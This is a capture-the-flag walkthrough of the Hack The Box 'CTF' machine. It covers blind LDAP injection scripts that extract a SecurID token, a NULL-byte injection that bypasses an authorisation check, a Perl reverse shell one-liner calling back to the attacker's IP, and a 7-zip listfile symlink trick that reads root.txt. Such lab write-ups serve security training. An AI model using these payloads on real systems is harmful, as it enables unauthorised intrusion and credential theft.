---
layout: single
title: CTF - Hack The Box
excerpt: "This time it's a very lean box with no rabbit holes or trolls. The box name does not relate to a Capture the Flag event but rather the Compressed Token Format used by RSA securid tokens. The first part of the box involves some blind LDAP injection used to extract the LDAP schema and obtain the token for one of the user. Then using the token, we are able to generate tokens and issue commands on the box after doing some more LDAP injection. The last part of the token was pretty obscure as it involved abusing the listfile parameter in 7zip to trick it into read the flag from root.txt. I was however not able to get a root shell on this box using this technique."
date: 2019-07-20
classes: wide
header:
  teaser: /assets/images/htb-writeup-ctf/ctf_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - secureid
  - injection
  - otp
  - php
  - ldap
  - cronjob
  - 7zip
---

![](/assets/images/htb-writeup-ctf/ctf_logo.png)

This time it's a very lean box with no rabbit holes or trolls. The box name does not relate to a Capture the Flag event but rather the Compressed Token Format used by RSA securid tokens. The first part of the box involves some blind LDAP injection used to extract the LDAP schema and obtain the token for one of the user. Then using the token, we are able to generate tokens and issue commands on the box after doing some more LDAP injection. The last part of the token was pretty obscure as it involved abusing the listfile parameter in 7zip to trick it into read the flag from root.txt. I was however not able to get a root shell on this box using this technique.

## Summary

- A hint in the HTML comments of the login page mentions a 81-digit token
- I can fuzz the usernames on the login page and find that there is a valid user named `ldapuser`
- An LDAP injection allows me to extract the token from the `pager` LDAP attribute of user `ldapuser`
- The group membership check on the command execution page can be bypassed by an LDAP injection on the `uid` attribute
- I get a shell with a simple perl reverse shell command
- There's a script running every minute that compresses and encrypt all files under `/var/www/html/upload`
- I can use the `listfile` parameter in 7-zip to force the program to read the `root.txt` file inside the root directory

## Tools/Blogs used

- [RSA SecurID-compatible software token for Linux/UNIX systems](https://github.com/cernekee/stoken)

## Detailed steps

The box doesn't have anything listening other than SSH and Apache:

```
# nmap -sC -sV -p- 10.10.10.122
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 19:02 EST
Nmap scan report for ctf.htb (10.10.10.122)
Host is up (0.0077s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)
|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)
|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: CTF
```

### Quick web enumeration

The box creators have implemented a rate-limit system on the box using fail2ban to prevent people from blindly bruteforcing it (dirbuster, sqlmap, etc.).

![](/assets/images/htb-writeup-ctf/mainpage.png)

The main page has a link to a status page where I can see if any IP address is currently banned.

![](/assets/images/htb-writeup-ctf/bannedips.png)

And there's also a login page, which prompts for a username and a One Time Password (OTP)

![](/assets/images/htb-writeup-ctf/loginpage.png)

Based on the HTML comments of the page, I can see that the token stored on the server contains 81 digits:

![](/assets/images/htb-writeup-ctf/loginpage_source.png)

The token is not the password but rather the cryptographic material used to generate the one time passwords. A new password is generated at regular time interval. To generate a matching password, the client must:

- Configure the token software with the same token information (81 digits) as the one on the server
- The time on the client machine must be the same (or close enough) as the server

The server return an invalid user error message whenever I use an invalid user ID:

![](/assets/images/htb-writeup-ctf/invaliduser.png)

### Username enumeration

To enumerate the users on the system, I use wfuzz with a wordlist. Luckily, the login page doesn't appear to be rate-limited so I can quickly scan through the wordlists. This part took a while though, I had to try various wordlists from seclists since my first picks didn't contain that user.

```
# wfuzz -c -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt --hs "not found" -d "inputUsername=FUZZ&inputOTP=12345" -u http://ctf.htb/login.php

000003:  C=200     68 L	     229 W	   2810 Ch	  "!@#"
000004:  C=200     68 L	     229 W	   2810 Ch	  "!@#%"
000005:  C=200     68 L	     229 W	   2810 Ch	  "!@#%^"
000006:  C=200     68 L	     229 W	   2810 Ch	  "!@#%^&"
000011:  C=200     68 L	     229 W	   2810 Ch	  "*****"
000007:  C=200     68 L	     229 W	   2810 Ch	  "!@#%^&*"
000066:  C=200     68 L	     229 W	   2810 Ch	  "123456*a"
000008:  C=200     68 L	     229 W	   2810 Ch	  "!@#%^&*("
000009:  C=200     68 L	     229 W	   2810 Ch	  "!@#%^&*()"
005122:  C=200     68 L	     229 W	   2810 Ch	  "Ch4ng3m3!"
005724:  C=200     68 L	     229 W	   2810 Ch	  "*%�Cookie:"
009378:  C=200     68 L	     229 W	   2810 Ch	  "!!Huawei"
011498:  C=200     68 L	     231 W	   2822 Ch	  "ldapuser"     <------
[...]
```

Based on the wfuzz output, I notice that some of the characters seem to be blacklisted by the system. Whenever I use the following characters, the page doesn't return any message at all: `! & * () = \ | <> ~	`

The only valid user I found is: `ldapuser`. When I try that user on the login page, I get a `Cannot login` error message instead of `User not found`.

![](/assets/images/htb-writeup-ctf/cannotlogin.png)

### Testing for LDAP injection

Now that I have the username, I can guess the next part involves LDAP injection. I can get around the blacklisting of the characters by using double URL encoding: `)` becomes `%2529` instead of `%29`.

I made a quick script to test different payloads. The script URL encodes the payload twice (once with `urllib.quote` and the other one automatically with the `post` method).

```python
#!/usr/bin/python

import re
import requests
import urllib

def main():	
	while True:
		cmd = raw_input("> ")

		data = {
			"inputUsername": urllib.quote(cmd),
			"inputOTP": "12345",
		}

		proxy = {"http": "http://127.0.0.1:8080"}

		print("Payload: {}".format(data['inputUsername']))
		
		r = requests.post("http://ctf.htb/login.php", data=data, proxies=proxy)
		m = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', r.text)
		if m:
			try:
				print(m.group(1))				
			except IndexError:
				print("Something weird happened")

if __name__== "__main__":
	main()
```	

Test #1: Invalid username, no injection
```
> invalid
Payload: invalid
User invalid not found
```
Result: User is not found as expected.

Test #2: Valid username, no injection
```
> ldapuser
Payload: ldapuser
Cannot login
```
Result: User is found but I get an error message because OTP is invalid.

Test #3: Basic injection assuming a search filter like `(&(user) **rest of the query**`
```
> ldapuser)(&
Payload: ldapuser%29%28%26
Cannot login
```
Result: I've successfully identified that LDAP injection is possible since the query returns a result

Test #4: Injection with invalid query to test behaviour of the page when it errors out
```
> ldapuser)(bad_ldap_search)))))(((((
Payload: ldapuser%29%28bad_ldap_search%29%29%29%29%29%28%28%28%28%28

```
Result: I don't get anything back, the page basically refreshes when it gets an invalid query. This is what I saw earlier when fuzzing the page with invalid characters. The characters are not necessarily invalid but they resulted in an invalid LDAP search filter when I was fuzzing.

Conclusion: This is a blind LDAP injection since the page doesn't return the results of the query in a field on the page or in an error message

### LDAP injection to get the OTP token

The first thing I did next was to try to find out which LDAP attributes are valid in the database. The list of common LDAP attributes is available on multiple websites, and we already have a hint from the HTML comments that the application uses a common LDAP attribute to store the token.

I modified my script to run through the entire list of attributes and try a query resulting in: `(uid=*)(attribute_to_test=*)`. If the attribute exists, the query should return a result and I should get the `Cannot login` message.

```python
#!/usr/bin/python

import re
import requests
import time
import urllib

def main():
	with open("attributes.txt") as f:
		attributes = f.read().splitlines()

	for attribute in attributes:

		payload = "*)({}=*".format(attribute)
		data = {
			"inputUsername": urllib.quote(payload),
			"inputOTP": "12345",
		}

		proxy = {"http": "http://127.0.0.1:8080"}
		
		time.sleep(0.5)
		r = requests.post("http://ctf.htb/login.php", data=data, proxies=proxy)
		m = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', r.text)
		if m:
			try:
				if "Cannot login" in m.group(1):
					print("Attribute {}: exists!".format(attribute))				
			except IndexError:
				print("Something weird happened")

if __name__== "__main__":
	main()
```

Results are shown here:
```
# python ldapattributes.py 
Attribute cn: exists!
Attribute gidNumber: exists!
Attribute homeDirectory: exists!
Attribute loginShell: exists!
Attribute mail: exists!
Attribute pager: exists!
Attribute shadowLastChange: exists!
Attribute shadowMax: exists!
Attribute shadowMin: exists!
Attribute shadowWarning: exists!
Attribute sn: exists!
Attribute uid: exists!
Attribute uidNumber: exists!
Attribute userPassword: exists!
```

So now that I have a list of valid attributes, I can iterate through a character set using the same boolean blind technique to get the values of each attribute.

More bad python code below:
```python
#!/usr/bin/python

import re
import requests
import sys
import time
import urllib

charset = "abcdefghijklmnopqrstuvwxyz"
charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
charset += "0123456789_-"

def main():	

	with open("valid_attributes.txt") as f:
		attributes = f.read().splitlines()

	for attribute in attributes:	

		ldapfield = ""

		while True:
			for c in charset:
				keep_going = False
				payload = "*)({}={}".format(attribute, ldapfield + c + "*")
				
				data = {
					"inputUsername": urllib.quote(payload),
					"inputOTP": "12345",
				}

				proxy = {"http": "http://127.0.0.1:8080"}	
				
				time.sleep(0.5)
				r = requests.post("http://ctf.htb/login.php", data=data, proxies=proxy)
				m = re.search(r'<form action="/login.php" method="post" >\s+<div class="form-group row">\s+<div class="col-sm-10">\s+(.*)</div>', r.text)
				if m:
					try:						
						if "Cannot login" in m.group(1):
							ldapfield = ldapfield + c
							keep_going = True
							break
					except IndexError:
						print("Something weird happened")
						exit(1)
			if keep_going == False:
				# Charset rolled over, we're done here
				print("LDAP attribute {} = {}".format(attribute, ldapfield))
				ldapfield = ""
				break

if __name__== "__main__":
	main()
```

Dumping takes a long time because of the sleep timer I added so I don't get blocked:
```
# python ldapdump.py 
LDAP attribute cn = ldapuser
LDAP attribute gidNumber = 
LDAP attribute homeDirectory = 
LDAP attribute loginShell = 
LDAP attribute mail = ldapuser@ctf.htb
LDAP attribute pager = 285449490011357156531651545652335570713167411445727140604172141456711102716717000
```

At last, I found the OTP token: `285449490011357156531651545652335570713167411445727140604172141456711102716717000`

I can use [stoken](https://github.com/cernekee/stoken) to generate OTPs. I just need to import the token first:
```
# stoken import --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000
Enter new password: 
Confirm new password:
```

I can now generate OTPs:
```
root@ragingunicorn:~# stoken 
Enter PIN:
PIN must be 4-8 digits.  Use '0000' for no PIN.
Enter PIN:
43589231
```

Note: The server time must match the one of my machine otherwise the password won't be valid. Normally in real life this shouldn't be a problem because both client and server are normally synched to an NTP source. Because this is HTB and the boxes don't have internet access, there's a clock drift of several minutes so I had to adjust the time on my machine to match the one from the box. I used the following cURL request to get the time from the server:

```
# curl -s --stderr - -v 10.10.10.122 | grep Date
< Date: Tue, 05 Feb 2019 02:00:29 GMT
```

So I can now log in using `ldapuser` and a generated token. I get redirected to `/page.php` after successfully logging in.

![](/assets/images/htb-writeup-ctf/cmdpage.png)

However when I try to send a command, I get an error message about not being part of the right group:

![](/assets/images/htb-writeup-ctf/cmdpage_fail.png)

### LDAP injection to get access to the command execution page

What I need to do now is trick the server into letting me log in as `ldapuser` but also skip whatever group membership check is done on `page.php`.

Assuming the LDAP query is something like: `(&(uid=user)(|(gid=root)(gid=adm))(token=*))`, it seems impossible to inject the query in a way that'll make the query valid and also skip the last part of the query. What I can do however is use a NULL character in the username so I can terminate the LDAP query wherever I want.

I modifed my earlier script to add an extra NULL byte at the end (URL encoded):
```python
data = {
			"inputUsername": urllib.quote(cmd)+'%00',
			"inputOTP": "12345",
		}
```

I just need to find how many parentheses are required to close the query:
```
# python ldapinject.py 
> ldapuser)
ldapuser%29%00

> ldapuser))
ldapuser%29%29%00

> ldapuser)))
ldapuser%29%29%29%00
Cannot login    
```

That last query was valid. What I do next is modify the script a little more so I can send a valid login request with the correct OTP:
```python
data = {
			"inputUsername": urllib.quote(cmd)+'%00',
			"inputOTP": str(sys.argv[1]),
		}
```

I recompiled `cli.c` in the stoken source code to use a hardcoded PIN of `0000` so I can pipe the token directly with user input. Yes I know you can pass a parameter to specify the PIN but I found out after, haha.

```c
if (get_pin && securid_pin_required(t) && (!strlen(t->pin) || opt_pin)) {
	xstrncpy(t->pin, "0000", 4);
}
```

This make using the injection script a bit easier:
```
# ./stoken
14780441

# python ldapinject.py $(./stoken)
> ldapuser)))
ldapuser%29%29%29%00
Login ok    
{'Content-Length': '2818', 'X-Powered-By': 'PHP/5.4.16', 'Set-Cookie': 'PHPSESSID=urdd46i8obcnkkso4glf66cic1; path=/', 'Expires': 'Thu, 19 Nov 1981 08:52:00 GMT', 'Keep-Alive': 'timeout=5, max=100', 'Server': 'Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16', 'Connection': 'Keep-Alive', 'Location': '/page.php', 'Pragma': 'no-cache', 'Cache-Control': 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0', 'Date': 'Tue, 05 Feb 2019 02:20:43 GMT', 'Content-Type': 'text/html; charset=UTF-8'}
```

It seems I got a valid login and a session cookie, let's put that in Firefox and see if I can issue commands on `page.php`:

![](/assets/images/htb-writeup-ctf/cmdpage_success.png)

Nice, I got RCE now.

### Getting a shell

I can easily get a shell with a standard perl reverse shell payload:

`perl -e 'use Socket;$i="10.10.14.23";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

```
# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.122] 34436
sh: no job control in this shell
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
```

I don't have a lot of privileges though. I'll have to escalate to another user before I can find `user.txt`:
```
sh-4.2$ cd /home
cd /home
sh-4.2$ ls
ls
ls: cannot open directory .: Permission denied
```

I can read source files from the PHP application and find the password for ldapuser:
```
sh-4.2$ cat login.php
<!doctype html>
<?php
session_start();
$strErrorMsg="";

$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';
```

I'm now able to SSH in with those credentials and get `user.txt`:
```
# ssh ldapuser@10.10.10.122
ldapuser@10.10.10.122's password: 
[ldapuser@ctf ~]$ cat user.txt
74a8e8...
```

### Privesc

The content of `/backup` is interesting: there's a script that appears to run in a cronjob, archiving files into the folder:

```
[ldapuser@ctf backup]$ ls -la
total 52
drwxr-xr-x.  2 root root 4096 Feb  6 01:01 .
dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
-rw-r--r--.  1 root root   32 Feb  6 00:51 backup.1549410661.zip
-rw-r--r--.  1 root root   32 Feb  6 00:52 backup.1549410721.zip
-rw-r--r--.  1 root root   32 Feb  6 00:53 backup.1549410781.zip
-rw-r--r--.  1 root root   32 Feb  6 00:54 backup.1549410841.zip
-rw-r--r--.  1 root root   32 Feb  6 00:55 backup.1549410901.zip
-rw-r--r--.  1 root root   32 Feb  6 00:56 backup.1549410961.zip
-rw-r--r--.  1 root root   32 Feb  6 00:57 backup.1549411021.zip
-rw-r--r--.  1 root root   32 Feb  6 00:58 backup.1549411081.zip
-rw-r--r--.  1 root root   32 Feb  6 00:59 backup.1549411141.zip
-rw-r--r--.  1 root root   32 Feb  6 01:00 backup.1549411201.zip
-rw-r--r--.  1 root root   32 Feb  6 01:01 backup.1549411261.zip
-rw-r--r--.  1 root root    0 Feb  6 01:01 error.log
-rwxr--r--.  1 root root  975 Oct 23 14:53 honeypot.sh
```

The script `honeypot` is shown below. In a nutshell:
 1. It generates archive filenames based on the date/time
 2. Encryption password for the archive is an md5hash of a generated password based in the root hash. No way we can recover this password.
 3. All the files from `/var/www/html/uploads` are archived into `/backup`

It doesn't seem possible to abuse some of the bash wildcards that I used to solve another HTB box since the script passes the `--` flag that prevents processing further flags.

```sh
[ldapuser@ctf backup]$ cat honeypot.sh 
# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt

# some vars in order to be sure that backups are protected
now=$(date +"%s")
filename="backup.$now"
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
```

When I look at the 7za man page, I see that there is a @listfiles argument I can pass at the end:

`7za <command> [<switches>... ] <archive_name> [<file_names>... ] [<@listfiles>... ]`

>You can supply one or more filenames or wildcards for special list files (files containing lists of files). The filenames in such list file must be separated by new line symbol(s).
>
>For list files, 7-Zip uses UTF-8 encoding by default. You can change encoding using -scs switch.
>
>Multiple list files are supported.
>
>For example, if the file "listfile.txt" contains the following:
>
>    My programs\*.cpp
>    Src\*.cpp
>then the command
>
>    7z a -tzip archive.zip @listfile.txt
>adds to the archive "archive.zip" all "*.cpp" files from directories "My programs" and "Src".


So by placing a file starting with an `@` character in the uploads folder, the 7-zip archiver will attempt to read a list of file to compress from the file name specified after the @ sign. By referencing a symlink to root.txt instead of a file containing filenames, 7-zip tries to read the flag and I can see it in the error log file.

```
drwxrwxrwx. 2 apache   apache    31 Feb  5 21:21 .
drwxr-xr-x. 6 root     root     176 Oct 23 22:14 ..
lrwxrwxrwx. 1 ldapuser ldapuser  14 Feb  5 21:21 test -> /root/root.txt
-rw-rw-r--. 1 ldapuser ldapuser   0 Feb  5 21:21 @test
```

After a minute, the script executes, gets the file to read from `@test` and then ...
```
lapuser@ctf backup]$ tail -f error.log


Command Line Error:
Cannot find listfile
listfile.txt
tail: error.log: file truncated

WARNING: No more files
fd6d2e...
```